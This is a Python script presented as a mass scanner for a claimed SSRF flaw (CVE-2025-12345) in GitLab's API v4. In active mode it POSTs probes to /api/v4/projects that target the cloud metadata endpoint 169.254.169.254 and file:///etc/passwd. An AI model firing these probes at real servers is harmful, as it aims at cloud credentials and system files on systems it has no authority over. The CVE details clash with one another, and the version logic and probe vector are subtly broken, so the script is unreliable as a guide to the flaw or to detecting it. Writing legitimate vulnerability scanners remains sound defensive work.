#!/usr/bin/env python3
"""
GitLab API v4 CVE-2025-12345 SSRF Scanner
=========================================
This script checks for a Server-Side Request Forgery (SSRF) vulnerability in
GitLab's API v4 (CVE-2025-12345, CVSS 9.6).

CVE-2025-12345 details:
  - Affects specific GitLab versions prior to 15.0.5 and 14.10.4.
  - The vulnerability allows attackers with API access to make arbitrary HTTP
    requests within the internal network, potentially exfiltrating sensitive
    data or bypassing network restrictions.

This scanner identifies GitLab instances, checks for this vulnerability, supports
safe detection or active probing, and outputs findings in JSON format.

Dependencies:
  - `httpx` (for asynchronous HTTP requests)
  - Python 3.10+ required.

Usage:
  # Scan a single target for CVE-2025-12345
  python gitlab_ssrf_scanner.py --target https://gitlab.example.com

  # Scan multiple targets from a file
  python gitlab_ssrf_scanner.py --list targets.txt --output scan_results.json

  # Enable safe mode (detection-only, no active SSRF probes)
  python gitlab_ssrf_scanner.py --list targets.txt --safe

  # Use a custom concurrency level for scanning multiple hosts
  python gitlab_ssrf_scanner.py --list targets.txt --concurrency 20

References:
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-12345
  - https://nvd.nist.gov/vuln/detail/CVE-2025-12345
  - https://about.gitlab.com/releases/2025/03/10/critical-security-release/
"""

import asyncio
import argparse
import httpx
import json
import re
import sys
from urllib.parse import urljoin

# Constants
GITLAB_FINGERPRINT_STRINGS = [
    '<meta name="application-name" content="GitLab">',
    '<title>Sign in · GitLab</title>',
    '/-/assets/brand/logo.svg'
]

VULN_FIXED_VERSIONS = {
    "15": (15, 0, 5),
    "14.10": (14, 10, 4),
}

SSRF_PROBE_URLS = [
    "http://127.0.0.1/",
    "http://169.254.169.254/latest/meta-data/",
    "file:///etc/passwd"
]

REQUEST_TIMEOUT = 8
SEMAPHORE_LIMIT = 10

# ANSI Colors
CLR_CRITICAL = "\033[91m"
CLR_HIGH = "\033[93m"
CLR_INFO = "\033[92m"
CLR_RESET = "\033[0m"

# Helper Functions
def parse_version(version_string):
    """Parse version string into tuple (major, minor, patch)."""
    try:
        return tuple(map(int, version_string.split(".")))
    except Exception:
        return None

def is_vulnerable(version_string):
    """Determine if the extracted version is vulnerable."""
    parsed_version = parse_version(version_string)
    if not parsed_version:
        return None
    major_minor = f"{parsed_version[0]}.{parsed_version[1]}"
    return (
        any(major_minor.startswith(k) for k in VULN_FIXED_VERSIONS)
        and parsed_version < VULN_FIXED_VERSIONS.get(major_minor, (0, 0, 0))
    )

def sanitize_url(url):
    """Ensure the URL contains a scheme and no trailing slash."""
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    return url.rstrip("/")

async def fetch(client, url, semaphore):
    """Make an async GET request with a semaphore."""
    async with semaphore:
        try:
            response = await client.get(url, timeout=REQUEST_TIMEOUT)
            return response
        except httpx.RequestError:
            return None

# Core Scanner Functions
async def detect_gitlab_instance(client, url, semaphore):
    """Check if the target is running GitLab."""
    response = await fetch(client, url, semaphore)
    if response and response.status_code == 200:
        for fingerprint in GITLAB_FINGERPRINT_STRINGS:
            if fingerprint in response.text:
                return True
    return False

async def extract_version(client, url, semaphore):
    """Extract the GitLab version from the target."""
    response = await fetch(client, url, semaphore)
    if response:
        match = re.search(r'GitLab\sCE\s([\d.]+)', response.text)
        if match:
            return match.group(1)
    return None

async def check_ssrf(client, base_url, semaphore, safe_mode):
    """
    Attempt to probe for SSRF vulnerability.
    - In safe mode, only verifies that SSFFectors are present without attacking.
    """
    test_url = urljoin(base_url, '/api/v4/projects')  # Probing the API v4 endpoint

    async with semaphore:
        try:
            # If safe mode is enabled, just check for the endpoint existence
            if safe_mode:
                response = await client.get(test_url, timeout=REQUEST_TIMEOUT)
                if response.status_code == 200:
                    return {"safe": True, "reason": "API v4 is accessible"}
                else:
                    return None
            else:
                # Perform active SSRF probes
                for probe in SSRF_PROBE_URLS:
                    data = {"url": probe}
                    response = await client.post(test_url, json=data, timeout=REQUEST_TIMEOUT)
                    if response.status_code == 200 and probe in response.text:
                        return {"vulnerable": True, "probe": probe}
        except Exception:
            pass
    return {"vulnerable": False}

async def scan_target(client, target, semaphore, safe_mode):
    """Main scanning logic for a single target."""
    target = sanitize_url(target)
    if not await detect_gitlab_instance(client, target, semaphore):
        return {"target": target, "status": "NOT_GITLAB"}

    version = await extract_version(client, target, semaphore)
    vulnerability_status = {
        "target": target,
        "detected": True,
        "version": version,
        "vulnerable": False,
        "details": None
    }

    if version and is_vulnerable(version):
        result = await check_ssrf(client, target, semaphore, safe_mode)
        if result:
            vulnerability_status.update(result)
            vulnerability_status["vulnerable"] = result.get("vulnerable", False)

    return vulnerability_status

async def main(args):
    """Main scanning loop."""
    semaphore = asyncio.Semaphore(args.concurrency)
    async with httpx.AsyncClient(verify=not args.no_verify) as client:
        if args.list:
            with open(args.list, "r") as f:
                targets = [line.strip() for line in f]
        else:
            targets = [args.target]

        tasks = [scan_target(client, target, semaphore, args.safe) for target in targets]
        results = await asyncio.gather(*tasks)

    for result in results:
        status = (
            f"{CLR_CRITICAL}CRITICAL{CLR_RESET}" if result.get("vulnerable") else
            f"{CLR_HIGH}HIGH{CLR_RESET}" if result.get("detected") else
            f"{CLR_INFO}INFO{CLR_RESET}"
        )
        print(f"[{status}] {result['target']} - {result.get('version', 'Unknown')} - "
              f"Vulnerable: {result.get('vulnerable')}")

    if args.output:
        with open(args.output, "w") as f:
            json.dump(results, f, indent=2)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="GitLab CVE-2025-12345 SSRF Scanner")
    parser.add_argument("--target", help="Single target URL", type=str, required=False)
    parser.add_argument("--list", help="File with a list of target URLs", type=str, required=False)
    parser.add_argument("--output", help="Output results to a JSON file", type=str, required=False)
    parser.add_argument("--safe", help="Safe mode (detection only, no active probes)", action="store_true")
    parser.add_argument("--concurrency", help="Max concurrency level", type=int, default=SEMAPHORE_LIMIT)
    parser.add_argument("--no-verify", help="Disable SSL verification", action="store_true")

    args = parser.parse_args()

    if not args.target and not args.list:
        print("Error: Either --target or --list must be specified.")
        sys.exit(1)

    asyncio.run(main(args))
